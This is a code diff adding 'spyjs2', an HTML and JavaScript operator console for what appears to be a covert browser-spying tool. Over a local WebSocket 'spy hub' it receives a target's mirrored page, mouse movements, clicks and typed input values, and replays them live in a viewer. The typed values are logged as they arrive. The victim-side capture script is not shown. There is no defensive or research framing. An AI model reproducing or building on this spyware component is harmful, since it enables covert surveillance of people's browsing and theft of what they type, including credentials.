@@ -1,0 +1,357 @@
+<!-- dev by N7y -->
+<!DOCTYPE html>
+<html>
+<head>
+    <title>spyjs2</title>
+    <style>
+        * {
+            box-sizing: border-box;
+        }
+        
+        body {
+            margin: 0;
+            padding: 20px;
+            background: #1a1a1a;
+            font-family: 'Courier New', monospace;
+            color: white;
+        }
+        
+        #controlPanel {
+            background: #2a2a2a;
+            padding: 15px;
+            border-radius: 10px;
+            margin-bottom: 20px;
+        }
+        
+        #mirrorStage {
+            background: white;
+            border: 3px solid #00ff88;
+            border-radius: 10px;
+            margin: 0 auto;
+            box-shadow: 0 0 30px rgba(0, 255, 136, 0.3);
+            position: relative;
+            overflow: auto;
+            width: 100%;
+            min-height: 600px;
+        }
+        
+        #mirrorContent {
+            width: 100%;
+            min-height: 100%;
+        }
+        
+        #ghostCursor {
+            position: fixed;
+            width: 20px;
+            height: 20px;
+            background: rgba(255, 0, 0, 0.7);
+            border-radius: 50%;
+            pointer-events: none;
+            z-index: 10000;
+            transition: all 0.1s ease-out;
+            transform: translate(-50%, -50%);
+            display: none;
+        }
+        
+        .clickFlash {
+            position: fixed;
+            width: 40px;
+            height: 40px;
+            border: 3px solid red;
+            border-radius: 50%;
+            pointer-events: none;
+            z-index: 10001;
+            animation: clickBoom 0.5s ease-out forwards;
+        }
+        
+        @keyframes clickBoom {
+            0% { transform: scale(0.5); opacity: 1; }
+            100% { transform: scale(2); opacity: 0; }
+        }
+        
+        #status {
+            color: #00ff88;
+            padding: 10px;
+            font-size: 16px;
+            background: #2a2a2a;
+            border-radius: 5px;
+            margin-bottom: 10px;
+        }
+        
+        .highlight {
+            outline: 2px solid yellow !important;
+            transition: outline 0.3s;
+        }
+        
+        .logEntry {
+            background: #333;
+            padding: 5px 10px;
+            margin: 2px 0;
+            border-radius: 3px;
+            font-size: 12px;
+            border-left: 3px solid #00ff88;
+        }
+        
+        #eventLog {
+            max-height: 200px;
+            overflow-y: auto;
+            margin-top: 10px;
+        }
+        
+        .waiting-message {
+            padding: 40px;
+            text-align: center;
+            color: #666;
+        }
+    </style>
+</head>
+<body>
+    <!-- <dev by N7y id="controlPanel"> -->
+
+        <h1>Spyjs2</h1>
+
+        <div id="status">Connecting to socket...</div>
+        <button onclick="clearLog()">Clear Log</button>
+        <div id="eventLog"></div>
+    </div>
+    <div id="mirrorStage">
+        <div id="mirrorContent" class="waiting-message">
+            <h2>Waiting for rhost...</h2>
+        </div>
+    </div>
+    <div id="ghostCursor"></div>
+
+    <script>
+        class MagicMirror {
+            constructor() {
+                this.mirrorFrame = document.getElementById('mirrorStage');
+                this.mirrorContent = document.getElementById('mirrorContent');
+                this.ghostCursor = document.getElementById('ghostCursor');
+                this.status = document.getElementById('status');
+                this.eventLog = document.getElementById('eventLog');
+                this.ws = null;
+                this.isConnected = false;
+                this.loadedStyles = new Set();
+                this.styleLoadCount = 0;
+                
+                this.startMirrorMagic();
+            }
+            
+            startMirrorMagic() {
+                this.connectToGossipHub();
+            }
+            
+            connectToGossipHub() {
+                try {
+                    this.ws = new WebSocket('ws://localhost:8766');
+                    
+                    this.ws.onopen = () => {
+                        this.isConnected = true;
+                        this.status.innerHTML = '<strong>mirror connected</strong>...';
+                        this.logEvent('connected');
+                    };
+                    
+                    this.ws.onmessage = (event) => {
+                        try {
+                            const gossip = JSON.parse(event.data);
+                            this.logEvent(`Received: ${gossip.type}`);
+                            this.handleGossip(gossip);
+                        } catch (e) {
+                            this.logEvent(`cant to parse message: ${e.message}`);
+                        }
+                    };
+                    
+                    this.ws.onerror = (oops) => {
+                        this.status.innerHTML = '<strong>Connection failed</strong> run  py server ';
+                        this.logEvent('Connection error');
+                    };
+                    
+                    this.ws.onclose = () => {
+                        this.isConnected = false;
+                        this.status.innerHTML = '<strong>Disconnected!</strong> Trying to reconnect...';
+                        setTimeout(() => this.connectToGossipHub(), 3000);
+                    };
+                    
+                } catch (e) {
+                    this.logEvent(`connection error: ${e.message}`);
+                }
+            }
+            
+            handleGossip(gossip) {
+                switch(gossip.type) {
+                    case 'welcome':
+                        this.status.innerHTML = '<strong>Connected to spy hub!</strong> Waiting for target...';
+                        break;
+                        
+                    case 'style_theft':
+                        this.applyStolenStyle(gossip);
+                        break;
+                        
+                    case 'full_dom_gossip':
+                        this.applyFullDOM(gossip);
+                        break;
+                        
+                    case 'dom_change':
+                        this.handleDomChange(gossip);
+                        break;
+                        
+                    case 'mouse_dance':
+                        this.moveGhostCursor(gossip.x, gossip.y);
+                        break;
+                        
+                    case 'element_tap':
+                        this.showClick(gossip.x, gossip.y, gossip.element);
+                        break;
+                        
+                    case 'keyboard_chatter':
+                        this.updateInput(gossip.element, gossip.value);
+                        break;
+                        
+                    case 'page_scroll':
+                        this.mirrorFrame.scrollTo(gossip.position.x, gossip.position.y);
+                        break;
+                        
+                    case 'viewport_grow':
+                        this.mirrorFrame.style.width = `${gossip.viewport.width}px`;
+                        this.mirrorFrame.style.height = `${gossip.viewport.height}px`;
+                        break;
+                }
+            }
+            
+            applyStolenStyle(styleGossip) {
+                const styleId = styleGossip.id || styleGossip.url;
+                
+                if (this.loadedStyles.has(styleId)) {
+                    return;
+                }
+                
+                this.loadedStyles.add(styleId);
+                this.styleLoadCount++;
+             
+                
+                if (styleGossip.styleType === 'inline' || styleGossip.styleType === 'external') {
+                    const styleTag = document.createElement('style');
+                    styleTag.setAttribute('data-mirror-style', styleId);
+                    styleTag.textContent = styleGossip.content;
+                    document.head.appendChild(styleTag);
+                    
+                    
+                } else if (styleGossip.styleType === 'external_link') {
+                  
+                    const linkTag = document.createElement('link');
+                    linkTag.setAttribute('data-mirror-style', styleId);
+                    linkTag.rel = 'stylesheet';
+                    linkTag.href = styleGossip.url;
+                    document.head.appendChild(linkTag);
+                    
+                    this.logEvent(`external css: ${styleGossip.url}`);
+                }
+            }
+            
+            applyFullDOM(domGossip) {
+                
+         
+                this.mirrorContent.innerHTML = domGossip.html;
+                this.mirrorContent.classList.remove('waiting-message');
+                this.mirrorFrame.style.width = `${domGossip.pageInfo.viewport.width}px`;
+                this.mirrorFrame.style.height = `${domGossip.pageInfo.viewport.height}px`;
+                
+                this.status.innerHTML = `<strong>Website loaded!</strong> ${domGossip.pageInfo.url}`;
+                this.logEvent(`🎉 Full website mirrored! ${domGossip.pageInfo.title}`);
+            }
+            
+            handleDomChange(gossip) {
+                this.logEvent(`DOM change: ${gossip.action} on ${gossip.target}`);
+             
+            }
+            
+            moveGhostCursor(x, y) {
+                const mirrorRect = this.mirrorFrame.getBoundingClientRect();
+                const cursorX = mirrorRect.left + x;
+                const cursorY = mirrorRect.top + y;
+                
+                this.ghostCursor.style.display = 'block';
+                this.ghostCursor.style.left = cursorX + 'px';
+                this.ghostCursor.style.top = cursorY + 'px';
+            }
+            
+            showClick(x, y, elementAddress) {
+                this.logEvent(`Click on ---> ${elementAddress}`);
+                
+                const mirrorRect = this.mirrorFrame.getBoundingClientRect();
+                const clickX = mirrorRect.left + x;
+                const clickY = mirrorRect.top + y;
+                
+                const clickEffect = document.createElement('div');
+                clickEffect.className = 'clickFlash';
+                clickEffect.style.left = (clickX - 20) + 'px';
+                clickEffect.style.top = (clickY - 20) + 'px';
+                
+                document.body.appendChild(clickEffect);
+                
+                setTimeout(() => {
+                    if (clickEffect.parentNode) {
+                        clickEffect.remove();
+                    }
+                }, 500);
+                
+                const element = this.findElement(elementAddress);
+                if (element) {
+                    element.classList.add('highlight');
+                    setTimeout(() => {
+                        element.classList.remove('highlight');
+                    }, 1000);
+                }
+            }
+            
+            updateInput(elementAddress, value) {
+                this.logEvent(`input update: ${elementAddress} = "${value.substring(0, 20)}..."`);
+                const element = this.findElement(elementAddress);
+                if (element && (element.tagName === 'INPUT' || element.tagName === 'TEXTAREA')) {
+                    element.value = value;
+                    element.classList.add('highlight');
+                    setTimeout(() => {
+                        element.classList.remove('highlight');
+                    }, 200);
+                }
+            }
+            
+            findElement(address) {
+                try {
+                    if (!address || address === 'unknown') return null;
+                    
+                    let element = this.mirrorContent.querySelector(address);
+                    
+                    if (!element && address.includes('#')) {
+                        const idPart = address.split('#')[1];
+                        if (idPart) {
+                            const id = idPart.split('.')[0];
+                            element = this.mirrorContent.querySelector(`#${id}`);
+                        }
+                    }
+                    
+                    return element;
+                } catch (e) {
+                    return null;
+                }
+            }
+            
+            logEvent(message) {
+                const logEntry = document.createElement('div');
+                logEntry.className = 'logEntry';
+                logEntry.textContent = `[${new Date().toLocaleTimeString()}] ${message}`;
+                this.eventLog.appendChild(logEntry);
+                this.eventLog.scrollTop = this.eventLog.scrollHeight;
+            }
+        }
+        
+        function clearLog() {
+            const eventLog = document.getElementById('eventLog');
+            eventLog.innerHTML = '';
+        }
+        
+        
+        const magicMirror = new MagicMirror();
+    </script>
+</body>
+</html>
